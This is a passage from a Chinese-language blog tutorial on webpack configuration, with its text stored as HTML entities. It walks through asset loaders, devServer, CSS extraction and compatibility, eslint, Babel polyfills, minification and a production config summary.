      // &#x590D;&#x5236; &apos;./src/index.html&apos; &#x6587;&#x4EF6;&#x5E76;&#x81EA;&#x52A8;&#x5F15;&#x5165;&#x6253;&#x5305;&#x8F93;&#x51FA;&#x7684;&#x6240;&#x6709;&#x8D44;&#x6E90;JS/CSS
      template: &apos;./src/index.html&apos; 
    }) 
  ],
...
}
</code></pre>
<h3 id>&#x6253;&#x5305;&#x56FE;&#x7247;&#x8D44;&#x6E90;</h3>
<pre><code class="language-shell"># &#x4E0B;&#x8F7D;&#x5B89;&#x88C5; loader &#x5305;
npm install --save-dev html-loader url-loader
</code></pre>
<pre><code class="language-javascript">...
module.exports = { 
  ...
  module: { 
    rules: [ 
      ...,
      {
        // &#x5904;&#x7406;&#x56FE;&#x7247;&#x8D44;&#x6E90;-&#x9ED8;&#x8BA4;&#x5904;&#x7406;&#x4E0D;&#x4E86; html &#x4E2D; img &#x56FE;&#x7247;
        test: /\.(jpg|png|gif)$/, 
        // &#x4EC5;&#x4F7F;&#x7528;&#x4E00;&#x4E2A; loader &#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x6307;&#x660E; loader &#x800C;&#x4E0D;&#x9700;&#x8981; use
        // &#x4E0B;&#x8F7D; url-loader
        loader: &apos;url-loader&apos;,
        options: {
          // &#x56FE;&#x7247;&#x5927;&#x5C0F;&#x5C0F;&#x4E8E; 8kb&#xFF0C;&#x5C31;&#x4F1A;&#x88AB; base64 &#x5904;&#x7406; 
          // &#x4F18;&#x70B9;&#x80FD;&#x51CF;&#x5C11;&#x8BF7;&#x6C42;&#x6570;&#x91CF;-&#x51CF;&#x8F7B;&#x670D;&#x52A1;&#x5668;&#x538B;&#x529B;&#xFF1B;&#x7F3A;&#x70B9;&#x662F;&#x56FE;&#x7247;&#x4F53;&#x79EF;&#x4F1A;&#x66F4;&#x5927;-&#x6587;&#x4EF6;&#x8BF7;&#x6C42;&#x901F;&#x5EA6;&#x66F4;&#x6162; 
          limit: 8 * 1024, 
          // &#x95EE;&#x9898;: url-loader &#x9ED8;&#x8BA4; es6 &#x6A21;&#x5757;&#x5316;&#x89E3;&#x6790;; html-loader &#x5F15;&#x5165;&#x56FE;&#x7247;&#x662F; commonjs
          // &#x89E3;&#x51B3;&#x89E3;&#x6790;&#x65F6;&#x51FA;&#x73B0;&#x7684;[object Module]: &#x5173;&#x95ED; url-loader &#x7684; es6 &#x6A21;&#x5757;&#x5316;&#x5E76;&#x4F7F;&#x7528; commonjs &#x89E3;&#x6790; 
          esModule: false, 
          // &#x7ED9;&#x56FE;&#x7247;&#x8FDB;&#x884C;&#x91CD;&#x547D;&#x540D; - [hash:10]&#x53D6;&#x56FE;&#x7247;&#x7684; hash &#x7684;&#x524D; 10 &#x4F4D; [ext]&#x53D6;&#x6587;&#x4EF6;&#x539F;&#x6765;&#x6269;&#x5C55;&#x540D; 
          name: &apos;[hash:10].[ext]&apos; 
        }
      },
      { // &#x56FE;&#x7247;&#x9664;&#x4E86;&#x6837;&#x5F0F;&#x4E2D;&#x5F15;&#x5165;&#x8FD8;&#x53EF;&#x80FD;&#x9700;&#x8981; html &#x6807;&#x7B7E;&#x5F15;&#x5165;
        test: /\.html$/, 
        // &#x5904;&#x7406; html &#x6587;&#x4EF6;&#x7684; img &#x56FE;&#x7247; - &#x8D1F;&#x8D23;&#x5F15;&#x5165; img &#x4ECE;&#x800C;&#x80FD;&#x88AB; url-loader &#x5904;&#x7406; 
        loader: &apos;html-loader&apos; 
      } 
    ] 
  },
  ...
}
</code></pre>
<h3 id>&#x6253;&#x5305;&#x5176;&#x4ED6;&#x8D44;&#x6E90;</h3>
<pre><code class="language-shell"># &#x4E0B;&#x8F7D;&#x5B89;&#x88C5; loader &#x5305;
npm install --save-dev file-loader
</code></pre>
<pre><code class="language-javascript">...
module.exports = { 
  ...,
  module: { 
    rules: [ 
      ...,
      // &#x6253;&#x5305;&#x5176;&#x4ED6;&#x8D44;&#x6E90;-&#x9664;&#x4E86; html/js/css &#x8D44;&#x6E90;&#x4EE5;&#x5916;&#x7684;&#x8D44;&#x6E90;-&#x901A;&#x5E38;&#x4E3A;&#x77E2;&#x91CF;&#x56FE;&#x6807;&#x5E93;
      { // &#x6392;&#x9664; css/js/html
        exclude: /\.(css|js|html|less)$/, 
        loader: &apos;file-loader&apos;, 
        options: { name: &apos;[hash:10].[ext]&apos; } 
      }
    ] 
  },
  ...
}
</code></pre>
<h3 id="devserver">devserver</h3>
<p>&#x5F00;&#x53D1;&#x670D;&#x52A1;&#x5668; devServer &#x81EA;&#x52A8;&#x5316;&#x7F16;&#x8BD1;&#x3001;&#x6253;&#x5F00;&#x6D4F;&#x89C8;&#x5668;&#x3001;&#x5237;&#x65B0;&#x6D4F;&#x89C8;&#x5668;&#x3002;&#x53EA;&#x4F1A;&#x5728;&#x5185;&#x5B58;&#x4E2D;&#x7F16;&#x8BD1;&#x6253;&#x5305;&#xFF0C;&#x4E0D;&#x4F1A;&#x6709;&#x4EFB;&#x4F55;&#x8F93;&#x51FA;&#x3002;</p>
<pre><code class="language-shell"># &#x4E0B;&#x8F7D;&#x5305;
npm i webpack-dev-server
</code></pre>
<pre><code class="language-javascript">...
module.exports = { 
  ...,
  module: {
    rules: [ 
      ...
    ] 
  },
  plugins: [ 
    ... 
  ],
  mode: &apos;development&apos;,
  devServer: {
    contentBase: resolve(__dirname, &apos;build&apos;), // &#x9879;&#x76EE;&#x6784;&#x5EFA;&#x540E;&#x8DEF;&#x5F84;
    compress: true, // &#x542F;&#x52A8; gzip &#x538B;&#x7F29;
    port: 3000, // &#x7AEF;&#x53E3;&#x53F7; 
    open: true // &#x81EA;&#x52A8;&#x6253;&#x5F00;&#x6D4F;&#x89C8;&#x5668; 
  } 
};
</code></pre>
<p>NPM package.json &#x811A;&#x672C;&#x662F;&#x4E00;&#x79CD;&#x65B9;&#x4FBF;&#x8FD0;&#x884C;&#x672C;&#x5730;&#x5B89;&#x88C5;&#x7684;&#x4E8C;&#x8FDB;&#x5236;&#x6587;&#x4EF6;&#x7684;&#x65B9;&#x6CD5;&#xFF0C;&#x4E14;&#x4E0D;&#x5FC5;&#x62C5;&#x5FC3;&#x5176;&#x5B8C;&#x6574;&#x8DEF;&#x5F84;&#x3002;&#x53EF;&#x4EE5;&#x7B80;&#x5355;&#x5730;&#x5B9A;&#x4E49;&#x4E00;&#x4E2A;&#x811A;&#x672C;&#x5E76;&#x8FD0;&#x884C;&#x6307;&#x4EE4;&#x3002;</p>
<pre><code class="language-shell">npx webpack-dev-server
</code></pre>
<p>&#x8FD9;&#x91CC;&#x9700;&#x8981;&#x6CE8;&#x610F;&#xFF0C;&#x5982;&#x679C;&#x4F7F;&#x7528;&#x7684;&#x662F; <strong>webpack-cli 4</strong>  &#x6216; <strong>webpack 5</strong>&#xFF0C;&#x66F4;&#x6539; <code>webpack-dev-server</code> &#x4E3A; <code>webpack serve</code> &#x3002;<a href="https://stackoverflow.com/questions/40379139/cannot-find-module-webpack-bin-config-yargs">stackoverflow&#x94FE;&#x63A5;</a>&#x3002;</p>
<ul>
<li>&#x5BF9;&#x4E8E; webpack-cli 3.x&#xFF1A;</li>
</ul>
<pre><code class="language-js">&quot;scripts&quot;: { &quot;start:dev&quot;: &quot;webpack-dev-server&quot; }
</code></pre>
<ul>
<li>&#x5BF9;&#x4E8E; webpack-cli 4.x&#xFF1A;</li>
</ul>
<pre><code class="language-js">&quot;scripts&quot;: { &quot;start:dev&quot;: &quot;webpack serve&quot; }
</code></pre>
<h3 id>&#x5F00;&#x53D1;&#x73AF;&#x5883;&#x914D;&#x7F6E;&#x5C0F;&#x7ED3;</h3>
<pre><code class="language-javascript">const { resolve } = require(&apos;path&apos;);
const HtmlWebpackPlugin = require(&apos;html-webpack-plugin&apos;);
module.exports = { 
  entry: &apos;./src/js/index.js&apos;, 
  output: { 
    filename: &apos;js/built.js&apos;, 
    path: resolve(__dirname, &apos;build&apos;) 
  },
  module: { 
    rules: [ // loader &#x7684;&#x914D;&#x7F6E; 
      { // &#x5904;&#x7406; less &#x8D44;&#x6E90; 
        test: /\.less$/, use: [&apos;style-loader&apos;, &apos;css-loader&apos;, &apos;less-loader&apos;] 
      },{ // &#x5904;&#x7406; css &#x8D44;&#x6E90; 
        test: /\.css$/, use: [&apos;style-loader&apos;, &apos;css-loader&apos;] 
      },{ // &#x5904;&#x7406;&#x56FE;&#x7247;&#x8D44;&#x6E90; 
        test: /\.(jpg|png|gif)$/, 
        loader: &apos;url-loader&apos;, 
        options: { 
          limit: 8 * 1024, 
          name: &apos;[hash:10].[ext]&apos;, // &#x5173;&#x95ED; es6 &#x6A21;&#x5757;&#x5316; 
          esModule: false, 
          outputPath: &apos;imgs&apos; 
        } 
      },{ // &#x5904;&#x7406; html &#x4E2D; img &#x8D44;&#x6E90; 
        test: /\.html$/, 
        loader: &apos;html-loader&apos; 
      },{ // &#x5904;&#x7406;&#x5176;&#x4ED6;&#x8D44;&#x6E90; 
        exclude: /\.(html|js|css|less|jpg|png|gif)/, 
        loader: &apos;file-loader&apos;,
        options: {
          name: &apos;[hash:10].[ext]&apos;, 
          outputPath: &apos;media&apos; 
        } 
      } 
    ] 
  },plugins: [ // plugins &#x7684;&#x914D;&#x7F6E; 
    new HtmlWebpackPlugin({ template: &apos;./src/index.html&apos; }) 
  ],
  mode: &apos;development&apos;,
  devServer: { 
    contentBase: resolve(__dirname, &apos;build&apos;),
    compress: true, 
    port: 3000,
    open: true 
  } 
};
</code></pre>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id>&#x751F;&#x4EA7;&#x73AF;&#x5883;&#x914D;&#x7F6E;</h2>
<h3 id="css">&#x63D0;&#x53D6; css &#x6210;&#x5355;&#x72EC;&#x6587;&#x4EF6;</h3>
<p>&#x6837;&#x5F0F;&#x7ECF;&#x8FC7;&#x5904;&#x7406;&#x6574;&#x5408;&#x5728; <code>.js</code> &#x4E2D;&#xFF08;css-loader&#xFF09;&#x4F1A;&#x4F7F; <code>.js</code> &#x4F53;&#x79EF;&#x975E;&#x5E38;&#x5927;&#xFF0C;&#x4E0B;&#x8F7D;&#x901F;&#x5EA6;&#x6162;&#x3002;&#x540C;&#x65F6;&#x5FC5;&#x987B;&#x5148;&#x52A0;&#x8F7D;&#x624D;&#x80FD;&#x521B;&#x5EFA;&#x6807;&#x7B7E;&#x52A0;&#x8F7D;&#x5728;&#x9875;&#x9762;&#x4E2D;&#xFF0C;&#x8FD9;&#x91CC;&#x53C8;&#x4F1A;&#x51FA;&#x73B0;&#x95EA;&#x5C4F;&#x73B0;&#x8C61;&#x3002;&#x6545;&#x9700;&#x8981;&#x5C06; <code>.css</code> &#x6587;&#x4EF6;&#x4ECE; <code>.js</code> &#x6587;&#x4EF6;&#x63D0;&#x53D6;&#x51FA;&#x6765;&#x3002;&#x53C8;&#x8003;&#x8651;&#x4EE3;&#x7801;&#x4F53;&#x79EF;&#x8F83;&#x5927;&#xFF0C;&#x9700;&#x8981;&#x8FDB;&#x884C;&#x538B;&#x7F29;&#x5904;&#x7406;&#x3002;&#x90E8;&#x5206;&#x6837;&#x5F0F;&#x4EE3;&#x7801;&#x4E0E; <code>.js</code> &#x4EE3;&#x7801;&#x5B58;&#x5728;&#x517C;&#x5BB9;&#x95EE;&#x9898;&#xFF0C;&#x5982;&#x90E8;&#x5206; CSS3 &#x9700;&#x8981;&#x52A0;&#x4E0A;&#x524D;&#x7F00;&#x624D;&#x53EF;&#x4EE5;&#x5728;&#x4F4E;&#x7248;&#x672C;&#x8FDB;&#x884C;&#x8FD0;&#x884C;&#x3002;<a href="https://webpack.js.org/plugins/mini-css-extract-plugin/">&#x8BE6;&#x7EC6;&#x4FE1;&#x606F;&#x70B9;&#x6B64;</a>&#x3002;</p>
<pre><code class="language-shell"># &#x4E0B;&#x8F7D;&#x63D2;&#x4EF6;
npm install --save-dev mini-css-extract-plugin
</code></pre>
<pre><code class="language-javascript">const { resolve } = require(&apos;path&apos;);
const HtmlWebpackPlugin = require(&apos;html-webpack-plugin&apos;);
const MiniCssExtractPlugin = require(&apos;mini-css-extract-plugin&apos;);
module.exports = {
  entry: &apos;./src/js/index.js&apos;,
  output: {
    filename: &apos;js/built.js&apos;,
    path: resolve(__dirname, &apos;build&apos;)
  },
  module: {
    rules: [
      { 
        test: /\.css$/,
        use: [ 
          // &#x521B;&#x5EFA; style &#x6807;&#x7B7E;&#xFF0C;&#x5C06;&#x6837;&#x5F0F;&#x653E;&#x5165; 
          // &apos;style-loader&apos;, 
          // &#x8FD9;&#x4E2A; loader &#x53D6;&#x4EE3; style-loader&#x3002;&#x4F5C;&#x7528;&#xFF1A;&#x63D0;&#x53D6; js &#x4E2D;&#x7684; css &#x6210;&#x5355;&#x72EC;&#x6587;&#x4EF6; 
          MiniCssExtractPlugin.loader, // &#x4E0D;&#x9700;&#x8981;&#x5F15;&#x53F7;
          // &#x5C06; css &#x6587;&#x4EF6;&#x6574;&#x5408;&#x5230; js &#x6587;&#x4EF6;&#x4E2D; 
          &apos;css-loader&apos; 
        ] 
      } 
    ] 
  },
  plugins: [ 
    new HtmlWebpackPlugin({ 
      template: &apos;./src/index.html&apos; 
    }), 
    new MiniCssExtractPlugin({ 
      // &#x5BF9;&#x8F93;&#x51FA;&#x7684; css &#x6587;&#x4EF6;&#x8FDB;&#x884C;&#x91CD;&#x547D;&#x540D; 
      filename: &apos;css/built.css&apos; 
    }) 
  ],
  mode: &apos;development&apos; 
};
</code></pre>
<h3 id="css">css &#x517C;&#x5BB9;&#x6027;&#x5904;&#x7406;</h3>
<p>&#x517C;&#x5BB9;&#x5904;&#x7406;&#x9700;&#x8981; postcss --&gt; postcss-loader &#x4FDD;&#x8BC1;&#x5728; webpack &#x4E2D;&#x4F7F;&#x7528;&#xFF0C;&#x540C;&#x65F6;&#x901A;&#x8FC7; postcss-preset-env &#x8BC6;&#x522B;&#x73AF;&#x5883;&#xFF0C;&#x5E2E;&#x52A9; post-css &#x627E;&#x5230;  package.json &#x4E2D; browserlist &#x91CC;&#x7684;&#x914D;&#x7F6E;&#xFF0C;&#x901A;&#x8FC7;&#x914D;&#x7F6E;&#x52A0;&#x8F7D;&#x6307;&#x5B9A;&#x7684; css &#x517C;&#x5BB9;&#x6027;&#x6837;&#x5F0F;&#x3002;<a href="https://www.webpackjs.com/loaders/postcss-loader/">&#x8BE6;&#x60C5;&#x70B9;&#x6B64;</a>&#x3002;</p>
<pre><code class="language-shell"># &#x4E0B;&#x8F7D;&#x63D2;&#x4EF6;
npm install --save-dev postcss-loader postcss-preset-env
</code></pre>
<pre><code class="language-javascript">const { resolve } = require(&apos;path&apos;);
const HtmlWebpackPlugin = require(&apos;html-webpack-plugin&apos;);
const MiniCssExtractPlugin = require(&apos;mini-css-extract-plugin&apos;); 
// &#x8BBE;&#x7F6E; nodejs &#x73AF;&#x5883;&#x53D8;&#x91CF; -- &#x6307;&#x660E;&#x4F7F;&#x7528; package.json &#x4E2D;&#x54EA;&#x4E2A;&#x73AF;&#x5883;&#x7684;&#x914D;&#x7F6E;
// process.env.NODE_ENV = &apos;development&apos;; // &#x4E0D;&#x8FDB;&#x884C;&#x914D;&#x7F6E;&#x5219;&#x4F1A;&#x9ED8;&#x8BA4;&#x4E3A;&#x751F;&#x4EA7;&#x73AF;&#x5883;
module.exports = { 
  entry: &apos;./src/js/index.js&apos;, 
  output: { 
    filename: &apos;js/built.js&apos;, 
    path: resolve(__dirname, &apos;build&apos;) 
  },
  module: { 
    rules: [ 
      { 
        test: /\.css$/, 
        use: [ 
          MiniCssExtractPlugin.loader, 
          &apos;css-loader&apos;, 
          // &#x4FEE;&#x6539;&#x914D;&#x7F6E;&#x9700;&#x8981;&#x5199;&#x6210;&#x5BF9;&#x8C61;&#x7684;&#x65B9;&#x5F0F;
          { 
            loader: &apos;postcss-loader&apos;, 
            options: { 
              ident: &apos;postcss&apos;, // &#x56FA;&#x5B9A;&#x5199;&#x6CD5;
              plugins: () =&gt; [ 
                // postcss &#x7684;&#x63D2;&#x4EF6; 
                require(&apos;postcss-preset-env&apos;)() 
              ] 
            } 
          } 
        ]
      } 
    ] 
  },
  plugins: [
    new HtmlWebpackPlugin({ template: &apos;./src/index.html&apos; }),
    new MiniCssExtractPlugin({ filename: &apos;css/built.css&apos; }) 
  ],
  mode: &apos;development&apos; 
};
</code></pre>
<p>browserlist &#x4ED3;&#x5E93;<a href="https://github.com/browserslist/browserslist">&#x70B9;&#x6B64;&#x8DF3;&#x8F6C;</a>&#x3002;</p>
<pre><code class="language-javascript">// package.json
&quot;browserslist&quot;: { 
  &quot;development&quot;: [ 
    // &#x517C;&#x5BB9;&#x6700;&#x8FD1;&#x7684;&#x6D4F;&#x89C8;&#x5668;&#x7248;&#x672C;
    &quot;last 1 chrome version&quot;, 
    &quot;last 1 firefox version&quot;,
    &quot;last 1 safari version&quot; 
  ],
  &quot;production&quot;: [ 
    &quot;&gt;0.2%&quot;,
    &quot;not dead&quot;,
    &quot;not op_mini all&quot; 
  ]
}
</code></pre>
<h3 id="js">js &#x8BED;&#x6CD5;&#x68C0;&#x67E5;</h3>
<p>&#x89C4;&#x8303;&#x4EE3;&#x7801;&#x4E66;&#x5199;&#x98CE;&#x683C;&#x53EF;&#x4EE5;&#x5728;&#x68C0;&#x67E5;&#x5E38;&#x89C1;&#x8BED;&#x6CD5;&#x9519;&#x8BEF;&#x7684;&#x540C;&#x65F6;&#x589E;&#x5F3A;&#x5065;&#x58EE;&#x6027;&#x3002;&#x6700;&#x5E38;&#x4F7F;&#x7528;&#x7684;&#x662F;&#x57FA;&#x4E8E; eslint &#x5E93;&#x7684; eslint-loader&#x3002;&#x6CE8;&#x610F; eslint &#x4EC5;&#x68C0;&#x67E5;&#x5F00;&#x53D1;&#x8005;&#x4E66;&#x5199;&#x7684;&#x6E90;&#x4EE3;&#x7801;&#xFF0C;&#x4E0D;&#x68C0;&#x67E5;&#x7B2C;&#x4E09;&#x65B9;&#x7684;&#x5E93;&#x3002;&#x90E8;&#x5206;&#x9700;&#x8981;&#x5FFD;&#x7565;&#x68C0;&#x67E5;&#x7684;&#x4EE3;&#x7801;&#x524D;&#x53EF;&#x4EE5;&#x52A0;&#x4E0A; <code>eslint-disable-next-line</code>&#x3002;<a href="https://www.npmjs.com/package/eslint-config-airbnb-base">&#x8BE6;&#x7EC6;&#x79FB;&#x6B65;</a>&#x3002;</p>
<pre><code class="language-shell"># &#x4E0B;&#x8F7D;&#x5B89;&#x88C5;&#x5305;&#x4F7F;&#x7528; slint-config-airbnb-base &#x5E93;&#x8FDB;&#x884C;&#x8BED;&#x6CD5;&#x68C0;&#x67E5;
npm install --save-dev eslint-loader eslint eslint-config-airbnb-base eslint-plugin-import
</code></pre>
<pre><code class="language-javascript">// &#x914D;&#x7F6E; package.json
// &#x5B98;&#x65B9;&#x662F;&#x8BF4;&#x52A0;&#x5165; .eslintrc &#x6B64;&#x5904;&#x52A0;&#x5165; package.json &#x5373;&#x53EF;
&quot;eslintConfig&quot;: { &quot;extends&quot;: &quot;airbnb-base&quot;, &quot;env&quot;: { &quot;browser&quot;: true } }
</code></pre>
<pre><code class="language-javascript">const { resolve } = require(&apos;path&apos;);
const HtmlWebpackPlugin = require(&apos;html-webpack-plugin&apos;);
const MiniCssExtractPlugin = require(&apos;mini-css-extract-plugin&apos;);
const OptimizeCssAssetsWebpackPlugin = require(&apos;optimize-css-assets-webpack-plugin&apos; )
// &#x8BBE;&#x7F6E; nodejs &#x73AF;&#x5883;&#x53D8;&#x91CF;
// process.env.NODE_ENV = &apos;development&apos;;
module.exports = { 
  entry: &apos;./src/js/index.js&apos;,
  output: {
    filename: &apos;js/built.js&apos;,
    path: resolve(__dirname, &apos;build&apos;) 
  },
  module: { 
    rules: [ 
      /*
      &#x8BED;&#x6CD5;&#x68C0;&#x67E5;&#xFF1A; eslint-loader eslint 
      &#x6CE8;&#x610F;&#xFF1A;&#x53EA;&#x68C0;&#x67E5;&#x81EA;&#x5DF1;&#x5199;&#x7684;&#x6E90;&#x4EE3;&#x7801;&#xFF0C;&#x7B2C;&#x4E09;&#x65B9;&#x7684;&#x5E93;&#x662F;&#x4E0D;&#x7528;&#x68C0;&#x67E5;&#x7684; 
      &#x8BBE;&#x7F6E;&#x68C0;&#x67E5;&#x89C4;&#x5219;: package.json &#x4E2D; eslintConfig &#x4E2D;&#x8BBE;&#x7F6E;~ 
      &quot;eslintConfig&quot;: {
      &quot;extends&quot;: &quot;airbnb-base&quot; 
      } 
      airbnb &#x9700;&#x8981; eslint-config-airbnb-base eslint-plugin-import eslint &#x4E09;&#x4E2A;&#x5E93;
      */
      { 
        test: /\.js$/,
        exclude: /node_modules/,  // &#x4E00;&#x5B9A;&#x8981;&#x6CE8;&#x610F;, &#x5426;&#x5219;&#x4F1A;&#x5BF9; node_modules &#x8FDB;&#x884C;&#x68C0;&#x67E5;
        loader: &apos;eslint-loader&apos;, 
        options: { 
          // &#x81EA;&#x52A8;&#x4FEE;&#x590D; eslint &#x7684;&#x9519;&#x8BEF; 
          fix: true 
        } 
      } 
    ] 
  },
  plugins: [ 
    new HtmlWebpackPlugin({ template: &apos;./src/index.html&apos; }), 
    new MiniCssExtractPlugin({ filename: &apos;css/built.css&apos; }),
    // &#x538B;&#x7F29; css 
    new OptimizeCssAssetsWebpackPlugin() ],
  mode: &apos;development&apos;
};
</code></pre>
<h3 id="js">js &#x517C;&#x5BB9;&#x6027;&#x5904;&#x7406;</h3>
<p>chrome &#x6D4F;&#x89C8;&#x5668;&#x4E2D;&#x53EF;&#x4EE5;&#x8BC6;&#x522B;&#x4E0D;&#x4EE3;&#x8868; IE &#x6D4F;&#x89C8;&#x5668;&#x53EF;&#x4EE5;&#x8BC6;&#x522B; ES6 &#x53CA;&#x5176;&#x4EE5;&#x4E0A;&#x8BED;&#x6CD5;&#x3002;<code>@babel/preset-env</code> &#x8F6C;&#x6362;&#x57FA;&#x672C;&#x8BED;&#x6CD5;&#xFF0C;<code>@babel/polyfill</code> &#x5168;&#x90E8;&#x517C;&#x5BB9;&#x6027;&#x5904;&#x7406;&#xFF08;&#x5305;&#x62EC; promise &#xFF09;&#x3002;<code>@babel/polyfill</code> &#x4E0B;&#x8F7D;&#x540E;&#x5F15;&#x5165; <code>js</code> &#x6587;&#x4EF6;&#x5373;&#x53EF;&#xFF08;&#x66B4;&#x529B;&#xFF09;&#x3002;&#x9700;&#x8981;&#x517C;&#x5BB9;&#x6027;&#x5904;&#x7406;&#x6309;&#x9700;&#x52A0;&#x8F7D;&#x5219;&#x8003;&#x8651; <code>core-js</code> &#x3002;&#x4F46;&#x662F;&#x4F7F;&#x7528; <code>core-js</code> &#x65F6;&#xFF0C;&#x4E0D;&#x80FD;&#x4F7F;&#x7528;<code>@babel/polyfill</code> &#xFF0C;&#x5728; <code>.js</code> &#x4E2D;&#x5F15;&#x5165;&#x7684;&#x9700;&#x8981;&#x6CE8;&#x91CA;&#x6389;&#x3002;</p>
<pre><code class="language-shell"># &#x4E0B;&#x8F7D;&#x5B89;&#x88C5;&#x5305;
npm install --save-dev babel-loader @babel/core @babel/preset-env @babel/polyfill core-js
</code></pre>
<pre><code class="language-javascript">const { resolve } = require(&apos;path&apos;);
const HtmlWebpackPlugin = require(&apos;html-webpack-plugin&apos;);
module.exports = {
  entry: &apos;./src/js/index.js&apos;,
  output: { 
    filename: &apos;js/built.js&apos;,
    path: resolve(__dirname, &apos;build&apos;)
    },
  module: {
    rules: [ { 
      test: /\.js$/, 
      exclude: /node_modules/,
      // webpack1.x &#x65F6;&#x662F; loader: &apos;babel&apos;
      loader: &apos;babel-loader&apos;, // webpack2.x+ 
      options: { // &#x9884;&#x8BBE;&#xFF1A;&#x6307;&#x793A; babel &#x505A;&#x600E;&#x4E48;&#x6837;&#x7684;&#x517C;&#x5BB9;&#x6027;&#x5904;&#x7406; 
        presets: 
        [[ 
          &apos;@babel/preset-env&apos;, { 
          // &#x6309;&#x9700;&#x52A0;&#x8F7D; useBuiltIns: &apos;usage&apos;,
          // &#x6307;&#x5B9A; core-js &#x7248;&#x672C;
          corejs: { version: 3 },
          // &#x6307;&#x5B9A;&#x517C;&#x5BB9;&#x6027;&#x505A;&#x5230;&#x54EA;&#x4E2A;&#x7248;&#x672C;&#x6D4F;&#x89C8;&#x5668; -- core-js
          targets: { chrome: &apos;60&apos;, firefox: &apos;60&apos;, ie: &apos;9&apos;, safari: &apos;10&apos;, edge: &apos;17&apos; }
          }
		]]
      }
    }] 
  },
  plugins: [ new HtmlWebpackPlugin({ template: &apos;./src/index.html&apos; }) ],
  mode: &apos;development&apos;
</code></pre>
<h3 id="jshtml">js &#x538B;&#x7F29;&#x4E0E; html &#x538B;&#x7F29;</h3>
<p>&#x751F;&#x4EA7;&#x73AF;&#x5883;&#x4F1A;&#x81EA;&#x52A8;&#x538B;&#x7F29; <code>.js</code> &#x4EE3;&#x7801;&#x3002;</p>
<pre><code class="language-javascript">const { resolve } = require(&apos;path&apos;);
const HtmlWebpackPlugin = require(&apos;html-webpack-plugin&apos;);
module.exports = {
  entry: &apos;./src/js/index.js&apos;,
  output: {
    filename: &apos;js/built.js&apos;,
    path: resolve(__dirname, &apos;build&apos;) 
  },
  plugins: [ new HtmlWebpackPlugin({ template: &apos;./src/index.html&apos; }) ],
  // &#x751F;&#x4EA7;&#x73AF;&#x5883;&#x4E0B;&#x4F1A;&#x81EA;&#x52A8;&#x538B;&#x7F29; js &#x4EE3;&#x7801; 
  mode: &apos;production&apos; 
};
</code></pre>
<pre><code class="language-javascript">const { resolve } = require(&apos;path&apos;);
const HtmlWebpackPlugin = require(&apos;html-webpack-plugin&apos;);
module.exports = {
  entry: &apos;./src/js/index.js&apos;,
  output: {
    filename: &apos;js/built.js&apos;,
    path: resolve(__dirname, &apos;build&apos;) },
  plugins: [
    new HtmlWebpackPlugin({
      template: &apos;./src/index.html&apos;, 
      // &#x538B;&#x7F29; html &#x4EE3;&#x7801; 
      minify: { // &#x79FB;&#x9664;&#x7A7A;&#x683C; 
        collapseWhitespace: true, 
        // &#x79FB;&#x9664;&#x6CE8;&#x91CA;
        removeComments: true } }) 
  ],
  mode: &apos;production&apos; 
};
</code></pre>
<h3 id>&#x751F;&#x4EA7;&#x73AF;&#x5883;&#x914D;&#x7F6E;&#x6C47;&#x603B;</h3>
<pre><code class="language-javascript">const { resolve } = require(&apos;path&apos;);
const MiniCssExtractPlugin = require(&apos;mini-css-extract-plugin&apos;);
const OptimizeCssAssetsWebpackPlugin = require(&apos;optimize-css-assets-webpack-plugin&apos; );
const HtmlWebpackPlugin = require(&apos;html-webpack-plugin&apos;);
// &#x5B9A;&#x4E49; nodejs &#x73AF;&#x5883;&#x53D8;&#x91CF;: &#x51B3;&#x5B9A;&#x4F7F;&#x7528; browserslist &#x7684;&#x54EA;&#x4E2A;&#x73AF;&#x5883; 
process.env.NODE_ENV = &apos;production&apos;;
// &#x590D;&#x7528; loader 
const commonCssLoader = [
  MiniCssExtractPlugin.loader,
  &apos;css-loader&apos;,
  { 
    // &#x8FD8;&#x9700;&#x8981;&#x5728; package.json &#x4E2D;&#x5B9A;&#x4E49; browserslist
    loader: &apos;postcss-loader&apos;,
    options: {
      ident: &apos;postcss&apos;, 
      plugins: () =&gt; [require(&apos;postcss-preset-env&apos;)()] 
    } 
  } 
];
module.exports = {
  entry: &apos;./src/js/index.js&apos;,
  output: { filename: &apos;js/built.js&apos;, path: resolve(__dirname, &apos;build&apos;) },
  module: { 
    rules: [
      { test: /\.css$/, use: [...commonCssLoader] },
      { test: /\.less$/, use: [...commonCssLoader, &apos;less-loader&apos;] },
      /* &#x6B63;&#x5E38;&#x6765;&#x8BB2;, &#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#x53EA;&#x80FD;&#x88AB;&#x4E00;&#x4E2A; loader &#x5904;&#x7406;. &#x5F53;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#x8981;&#x88AB;&#x591A;&#x4E2A; loader &#x5904;&#x7406;, &#x90A3;&#x4E48;&#x4E00;&#x5B9A;&#x8981;&#x6307;&#x5B9A; loader &#x6267;&#x884C;&#x7684;&#x5148;&#x540E;&#x987A;&#x5E8F;: &#x5148;&#x6267;&#x884C; eslint &#x518D;&#x6267;&#x884C; babel (&#x5148;&#x6267;&#x884C; babel-loader&#x518D;&#x6267;&#x884C; eslint &#x5C31;&#x4F1A;&#x62A5;&#x9519;) */
      { // &#x5728; package.json &#x4E2D; eslintConfig --&gt; airbnb 
        test: /\.js$/,
        exclude: /node_modules/,
        // &#x4F18;&#x5148;&#x6267;&#x884C; &#x4E0D;&#x8BBA;&#x653E;&#x5728;&#x54EA;&#x91CC;&#x7684;&#x4F4D;&#x7F6E;!!!
        enforce: &apos;pre&apos;, 
        loader: &apos;eslint-loader&apos;,
        options: { fix: true }
      },
      {
        test: /\.js$/, // &#x9700;&#x8981;&#x68C0;&#x67E5;&#x7684; js &#x6587;&#x4EF6;
        exclude: /node_modules/,
        loader: &apos;babel-loader&apos;,
        options: {
          presets: [
            [
              &apos;@babel/preset-env&apos;,
              // @babel/preset-env - @babel/polifill(&#x592A;&#x5927;) - core-js
              { // &#x6309;&#x9700;&#x52A0;&#x8F7D; core-js
                useBuiltIns: &apos;usage&apos;, corejs: {version: 3}, // corejs &#x7248;&#x672C;
                targets: { chrome:&apos;60&apos;, firefox: &apos;50&apos; } // &#x6307;&#x5B9A;&#x505A;&#x5230;&#x6D4F;&#x89C8;&#x5668;&#x7248;&#x672C;
              }
            ]
          ]
        }
      },
      { 
        test: /\.(jpg|png|gif)/,
        loader: &apos;url-loader&apos;,
        // &#x8BB0;&#x4F4F;&#x5173;&#x95ED; es6
